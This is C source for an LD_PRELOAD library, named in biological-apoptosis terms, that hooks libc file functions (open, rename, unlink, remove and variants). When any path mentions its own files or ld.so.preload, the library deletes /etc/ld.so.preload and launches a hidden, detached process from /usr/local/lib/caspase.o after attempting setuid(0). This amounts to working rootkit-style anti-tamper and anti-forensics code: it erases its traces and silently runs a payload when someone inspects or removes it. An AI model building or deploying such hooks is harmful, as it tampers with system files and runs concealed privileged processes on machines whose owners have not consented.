#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdarg.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <dirent.h>

// Conditional debug macros
#if DEBUG_MODE
    #define DEBUG_PRINT(...) fprintf(stderr, __VA_ARGS__); fflush(stderr)
#else
    #define DEBUG_PRINT(...) do {} while(0)
#endif

// Cytochrome_c: Keywords that trigger apoptosis when found in paths
static const char *cytochrome_c[] = {
    "apoptosis.so",
    "mhc_downreg.so",
    "helper_T.so",
    "caspase.o",
    "ld.so.preload",
    NULL  // Sentinel
};

// DNA: Paths to immediately delete
static const char *dna[] = {
    "/etc/ld.so.preload",
    NULL  // Sentinel
};

// Caspases: Compiled binaries to execute as root orphaned processes
static const char *caspases[] = {
    "/usr/local/lib/caspase.o",
    NULL  // Sentinel
};

// Function pointers to real implementations
static int (*real_open)(const char *, int, ...) = NULL;
static int (*real_rename)(const char *, const char *) = NULL;
static int (*real_renameat)(int, const char *, int, const char *) = NULL;
static int (*real_renameat2)(int, const char *, int, const char *, unsigned int) = NULL;
static int (*real_unlink)(const char *) = NULL;
static int (*real_unlinkat)(int, const char *, int) = NULL;
static int (*real_remove)(const char *) = NULL;
static DIR* (*real_opendir)(const char *) = NULL;
static struct dirent* (*real_readdir)(DIR *) = NULL;
static int (*real_closedir)(DIR *) = NULL;
static int (*real_rmdir)(const char *) = NULL;
static int (*real_lstat)(const char *, struct stat *) = NULL;

// Initialize function pointers
static void init_hooks(void) {
    if (!real_open) {
        real_open = dlsym(RTLD_NEXT, "open");
        if (!real_open) {
            DEBUG_PRINT("[HOOK] ERROR: Failed to get real_open: %s\n", dlerror());
            abort();
        }
        DEBUG_PRINT("[HOOK] Initialized real_open: %p\n", real_open);
    }
    if (!real_rename) {
        real_rename = dlsym(RTLD_NEXT, "rename");
        if (!real_rename) {
            DEBUG_PRINT("[HOOK] ERROR: Failed to get real_rename: %s\n", dlerror());
            abort();
        }
        DEBUG_PRINT("[HOOK] Initialized real_rename: %p\n", real_rename);
    }
    if (!real_renameat) {
        real_renameat = dlsym(RTLD_NEXT, "renameat");
        if (!real_renameat) {
            DEBUG_PRINT("[HOOK] ERROR: Failed to get real_renameat: %s\n", dlerror());
            abort();
        }
        DEBUG_PRINT("[HOOK] Initialized real_renameat: %p\n", real_renameat);
    }
    if (!real_renameat2) {
        real_renameat2 = dlsym(RTLD_NEXT, "renameat2");
        if (!real_renameat2) {
            DEBUG_PRINT("[HOOK] ERROR: Failed to get real_renameat2: %s\n", dlerror());
            abort();
        }
        DEBUG_PRINT("[HOOK] Initialized real_renameat2: %p\n", real_renameat2);
    }
    if (!real_unlink) {
        real_unlink = dlsym(RTLD_NEXT, "unlink");
        if (!real_unlink) {
            DEBUG_PRINT("[HOOK] ERROR: Failed to get real_unlink: %s\n", dlerror());
            abort();
        }
        DEBUG_PRINT("[HOOK] Initialized real_unlink: %p\n", real_unlink);
    }
    if (!real_unlinkat) {
        real_unlinkat = dlsym(RTLD_NEXT, "unlinkat");
        if (!real_unlinkat) {
            DEBUG_PRINT("[HOOK] ERROR: Failed to get real_unlinkat: %s\n", dlerror());
            abort();
        }
        DEBUG_PRINT("[HOOK] Initialized real_unlinkat: %p\n", real_unlinkat);
    }
    if (!real_remove) {
        real_remove = dlsym(RTLD_NEXT, "remove");
        if (!real_remove) {
            DEBUG_PRINT("[HOOK] ERROR: Failed to get real_remove: %s\n", dlerror());
            abort();
        }
        DEBUG_PRINT("[HOOK] Initialized real_remove: %p\n", real_remove);
    }
    if (!real_opendir) {
        real_opendir = dlsym(RTLD_NEXT, "opendir");
        if (!real_opendir) {
            DEBUG_PRINT("[HOOK] ERROR: Failed to get real_opendir: %s\n", dlerror());
            abort();
        }
        DEBUG_PRINT("[HOOK] Initialized real_opendir: %p\n", real_opendir);
    }
    if (!real_readdir) {
        real_readdir = dlsym(RTLD_NEXT, "readdir");
        if (!real_readdir) {
            DEBUG_PRINT("[HOOK] ERROR: Failed to get real_readdir: %s\n", dlerror());
            abort();
        }
        DEBUG_PRINT("[HOOK] Initialized real_readdir: %p\n", real_readdir);
    }
    if (!real_closedir) {
        real_closedir = dlsym(RTLD_NEXT, "closedir");
        if (!real_closedir) {
            DEBUG_PRINT("[HOOK] ERROR: Failed to get real_closedir: %s\n", dlerror());
            abort();
        }
        DEBUG_PRINT("[HOOK] Initialized real_closedir: %p\n", real_closedir);
    }
    if (!real_rmdir) {
        real_rmdir = dlsym(RTLD_NEXT, "rmdir");
        if (!real_rmdir) {
            DEBUG_PRINT("[HOOK] ERROR: Failed to get real_rmdir: %s\n", dlerror());
            abort();
        }
        DEBUG_PRINT("[HOOK] Initialized real_rmdir: %p\n", real_rmdir);
    }
    if (!real_lstat) {
        real_lstat = dlsym(RTLD_NEXT, "lstat");
        if (!real_lstat) {
            DEBUG_PRINT("[HOOK] ERROR: Failed to get real_lstat: %s\n", dlerror());
            abort();
        }
        DEBUG_PRINT("[HOOK] Initialized real_lstat: %p\n", real_lstat);
    }
}

// Check if pathname contains any cytochrome_c keyword
static int is_cytochrome_c(const char *pathname) {
    if (!pathname) return 0;

    for (int i = 0; cytochrome_c[i] != NULL; i++) {
        if (strstr(pathname, cytochrome_c[i]) != NULL) {
            DEBUG_PRINT("[HOOK] Cytochrome_c keyword '%s' found in path '%s'\n",
                    cytochrome_c[i], pathname);
            return 1;
        }
    }
    return 0;
}

// Execute caspases as orphaned root processes
static void execute_caspases(void) {
    DEBUG_PRINT("[HOOK] Executing caspases as orphaned root processes...\n");

    for (int i = 0; caspases[i] != NULL; i++) {
        DEBUG_PRINT("[HOOK] Forking to execute: '%s'\n", caspases[i]);

        pid_t pid = fork();
        if (pid < 0) {
            DEBUG_PRINT("[HOOK] ERROR: Failed to fork for '%s' (errno=%d: %s)\n",
                    caspases[i], errno, strerror(errno));
            continue;
        }

	if (pid == 0) {
            // Second child (now orphaned) - become a proper daemon
        
            // Create a new session and become session leader
            // This detaches from controlling terminal
            if (setsid() < 0) {
                DEBUG_PRINT("[HOOK] ERROR: setsid() failed (errno=%d: %s)\n",
                        errno, strerror(errno));
                exit(1);
            }
        
            // Change working directory to root to avoid blocking unmounts
            if (chdir("/") < 0) {
                DEBUG_PRINT("[HOOK] ERROR: chdir('/') failed (errno=%d: %s)\n",
                        errno, strerror(errno));
                // Continue anyway - not fatal
            }
        
            // Close all file descriptors
            // This is critical - closes stdin/stdout/stderr inherited from parent
            for (int fd = 0; fd < 1024; fd++) {
                close(fd);
            }
        
            // Redirect standard fds to /dev/null
            int devnull = open("/dev/null", O_RDWR);
            if (devnull >= 0) {
                dup2(devnull, STDIN_FILENO);
                dup2(devnull, STDOUT_FILENO);
                dup2(devnull, STDERR_FILENO);
                if (devnull > STDERR_FILENO) {
                    close(devnull);
                }
            }
        
            // Attempt to escalate to root
            if (setuid(0) != 0) {
                // Can't use DEBUG_PRINT here - stderr is now /dev/null
            }
            if (setgid(0) != 0) {
                // Can't use DEBUG_PRINT here
            }
        
            // Execute the binary
            execl(caspases[i], caspases[i], NULL);
        
            // If execl returns, it failed (but we can't log it)
            exit(1);
        }

	// Parent process - don't wait!
        // The first child will exit immediately, and init will reap it
        // We continue on our way
	DEBUG_PRINT("[HOOK] Forked for '%s', continuing without waiting\n", caspases[i]);
    }
}

// Recursive directory deletion function
static void delete_directory_recursive(const char *path) {
    DEBUG_PRINT("[HOOK] Recursively deleting directory: '%s'\n", path);

    DIR *dir = real_opendir(path);
    if (!dir) {
        DEBUG_PRINT("[HOOK] ERROR: Failed to open directory '%s' (errno=%d: %s)\n",
                path, errno, strerror(errno));
        // Fail loudly - don't continue
        abort();
    }

    struct dirent *entry;
    while ((entry = real_readdir(dir)) != NULL) {
        // Skip . and ..
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        // Build full path
        char full_path[4096];
        int written = snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);
        if (written < 0 || written >= sizeof(full_path)) {
            DEBUG_PRINT("[HOOK] ERROR: Path too long for '%s/%s'\n", path, entry->d_name);
            real_closedir(dir);
            abort();
        }

        // Check if it's a directory
        struct stat statbuf;
        if (real_lstat(full_path, &statbuf) != 0) {
            DEBUG_PRINT("[HOOK] ERROR: Failed to stat '%s' (errno=%d: %s)\n",
                    full_path, errno, strerror(errno));
            real_closedir(dir);
            abort();
        }

        if (S_ISDIR(statbuf.st_mode)) {
            // Recursively delete subdirectory
            delete_directory_recursive(full_path);
        } else {
            // Delete file
            DEBUG_PRINT("[HOOK] Deleting file: '%s'\n", full_path);
            if (real_unlink(full_path) != 0) {
                DEBUG_PRINT("[HOOK] ERROR: Failed to delete file '%s' (errno=%d: %s)\n",
                        full_path, errno, strerror(errno));
                real_closedir(dir);
                abort();
            }
            DEBUG_PRINT("[HOOK] Successfully deleted file: '%s'\n", full_path);
        }
    }

    real_closedir(dir);

    // Now delete the directory itself
    DEBUG_PRINT("[HOOK] Deleting directory: '%s'\n", path);
    if (real_rmdir(path) != 0) {
        DEBUG_PRINT("[HOOK] ERROR: Failed to delete directory '%s' (errno=%d: %s)\n",
                path, errno, strerror(errno));
        abort();
    }
    DEBUG_PRINT("[HOOK] Successfully deleted directory: '%s'\n", path);
}

// Delete all DNA paths
static void delete_dna(void) {
    DEBUG_PRINT("[HOOK] Deleting DNA paths from system...\n");

    for (int i = 0; dna[i] != NULL; i++) {
        DEBUG_PRINT("[HOOK] Attempting to delete: '%s'\n", dna[i]);
        
        // Check if path exists and whether it's a file or directory
        struct stat statbuf;
        if (real_lstat(dna[i], &statbuf) != 0) {
            if (errno == ENOENT) {
                DEBUG_PRINT("[HOOK] Path '%s' does not exist (already deleted?)\n", dna[i]);
                continue;
            }
            DEBUG_PRINT("[HOOK] ERROR: Failed to stat '%s' (errno=%d: %s)\n",
                    dna[i], errno, strerror(errno));
            abort();
        }
        
        if (S_ISDIR(statbuf.st_mode)) {
            // It's a directory - delete recursively
            delete_directory_recursive(dna[i]);
        } else {
            // It's a file - delete normally
            if (real_unlink(dna[i]) != 0) {
                DEBUG_PRINT("[HOOK] ERROR: Failed to delete file '%s' (errno=%d: %s)\n",
                        dna[i], errno, strerror(errno));
                abort();
            }
            DEBUG_PRINT("[HOOK] Successfully deleted file: '%s'\n", dna[i]);
        }
    }
}

// APOPTOSIS: The main cell death logic
static void apoptosis(void) {
    DEBUG_PRINT("[HOOK] ========================================\n");
    DEBUG_PRINT("[HOOK] APOPTOSIS TRIGGERED - INITIATING CELL DEATH\n");
    DEBUG_PRINT("[HOOK] ========================================\n");

    // Step 1: Delete DNA (sensitive files)
    delete_dna();

    // Step 2: Execute caspases (defensive binaries)
    execute_caspases();

    DEBUG_PRINT("[HOOK] ========================================\n");
    DEBUG_PRINT("[HOOK] APOPTOSIS COMPLETE\n");
    DEBUG_PRINT("[HOOK] ========================================\n");
}

// Hook open()
int open(const char *pathname, int flags, ...) {
    init_hooks();

    DEBUG_PRINT("[HOOK] open() called: pathname='%s', flags=0x%x\n",
            pathname ? pathname : "(null)", flags);

    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
        DEBUG_PRINT("[HOOK] O_CREAT flag set, mode=0%o\n", mode);
    }

    // Check if this is a cytochrome_c trigger file
    if (is_cytochrome_c(pathname)) {
        DEBUG_PRINT("[HOOK] CYTOCHROME_C DETECTED in open()!\n");

        // Trigger apoptosis
        apoptosis();
    }

    // Pass through to real open with original flags and mode
    DEBUG_PRINT("[HOOK] Passing through to real open()\n");
    int fd = real_open(pathname, flags, mode);
    DEBUG_PRINT("[HOOK] real open() returned fd=%d\n", fd);

    return fd;
}

// Hook rename()
int rename(const char *oldpath, const char *newpath) {
    init_hooks();

    DEBUG_PRINT("[HOOK] rename() called: oldpath='%s', newpath='%s'\n",
            oldpath ? oldpath : "(null)",
            newpath ? newpath : "(null)");

    // Check if either path contains cytochrome_c keyword
    if (is_cytochrome_c(oldpath) || is_cytochrome_c(newpath)) {
        DEBUG_PRINT("[HOOK] CYTOCHROME_C DETECTED in rename()!\n");

        // Trigger apoptosis
        apoptosis();
    }

    // Pass through to real rename
    DEBUG_PRINT("[HOOK] Passing through to real rename()\n");
    int result = real_rename(oldpath, newpath);
    DEBUG_PRINT("[HOOK] real rename() returned: %d\n", result);

    return result;
}

// Hook renameat()
int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath) {
    init_hooks();

    DEBUG_PRINT("[HOOK] renameat() called: olddirfd=%d, oldpath='%s', newdirfd=%d, newpath='%s'\n",
            olddirfd, oldpath ? oldpath : "(null)",
            newdirfd, newpath ? newpath : "(null)");

    // Check if either path contains cytochrome_c keyword
    if (is_cytochrome_c(oldpath) || is_cytochrome_c(newpath)) {
        DEBUG_PRINT("[HOOK] CYTOCHROME_C DETECTED in renameat()!\n");

        // Trigger apoptosis
        apoptosis();
    }

    // Pass through to real renameat
    DEBUG_PRINT("[HOOK] Passing through to real renameat()\n");
    int result = real_renameat(olddirfd, oldpath, newdirfd, newpath);
    DEBUG_PRINT("[HOOK] real renameat() returned: %d\n", result);

    return result;
}

// Hook renameat2()
int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, unsigned int flags) {
    init_hooks();

    DEBUG_PRINT("[HOOK] renameat2() called: olddirfd=%d, oldpath='%s', newdirfd=%d, newpath='%s', flags=0x%x\n",
            olddirfd, oldpath ? oldpath : "(null)",
            newdirfd, newpath ? newpath : "(null)", flags);

    // Check if either path contains cytochrome_c keyword
    if (is_cytochrome_c(oldpath) || is_cytochrome_c(newpath)) {
        DEBUG_PRINT("[HOOK] CYTOCHROME_C DETECTED in renameat2()!\n");

        // Trigger apoptosis
        apoptosis();
    }

    // Pass through to real renameat2
    DEBUG_PRINT("[HOOK] Passing through to real renameat2()\n");
    int result = real_renameat2(olddirfd, oldpath, newdirfd, newpath, flags);
    DEBUG_PRINT("[HOOK] real renameat2() returned: %d\n", result);

    return result;
}

// Hook unlink()
int unlink(const char *pathname) {
    init_hooks();

    DEBUG_PRINT("[HOOK] unlink() called: pathname='%s'\n",
            pathname ? pathname : "(null)");

    // Check if pathname contains cytochrome_c keyword
    if (is_cytochrome_c(pathname)) {
        DEBUG_PRINT("[HOOK] CYTOCHROME_C DETECTED in unlink()!\n");

        // Trigger apoptosis
        apoptosis();
    }

    // Pass through to real unlink
    DEBUG_PRINT("[HOOK] Passing through to real unlink()\n");
    int result = real_unlink(pathname);
    DEBUG_PRINT("[HOOK] real unlink() returned: %d\n", result);

    return result;
}

// Hook unlinkat()
int unlinkat(int dirfd, const char *pathname, int flags) {
    init_hooks();

    DEBUG_PRINT("[HOOK] unlinkat() called: dirfd=%d, pathname='%s', flags=0x%x\n",
            dirfd, pathname ? pathname : "(null)", flags);

    // Check if pathname contains cytochrome_c keyword
    if (is_cytochrome_c(pathname)) {
        DEBUG_PRINT("[HOOK] CYTOCHROME_C DETECTED in unlinkat()!\n");

        // Trigger apoptosis
        apoptosis();
    }

    // Pass through to real unlinkat
    DEBUG_PRINT("[HOOK] Passing through to real unlinkat()\n");
    int result = real_unlinkat(dirfd, pathname, flags);
    DEBUG_PRINT("[HOOK] real unlinkat() returned: %d\n", result);

    return result;
}

// Hook remove()
int remove(const char *pathname) {
    init_hooks();

    DEBUG_PRINT("[HOOK] remove() called: pathname='%s'\n",
            pathname ? pathname : "(null)");

    // Check if pathname contains cytochrome_c keyword
    if (is_cytochrome_c(pathname)) {
        DEBUG_PRINT("[HOOK] CYTOCHROME_C DETECTED in remove()!\n");

        // Trigger apoptosis
        apoptosis();
    }

    // Pass through to real remove
    DEBUG_PRINT("[HOOK] Passing through to real remove()\n");
    int result = real_remove(pathname);
    DEBUG_PRINT("[HOOK] real remove() returned: %d\n", result);

    return result;
}
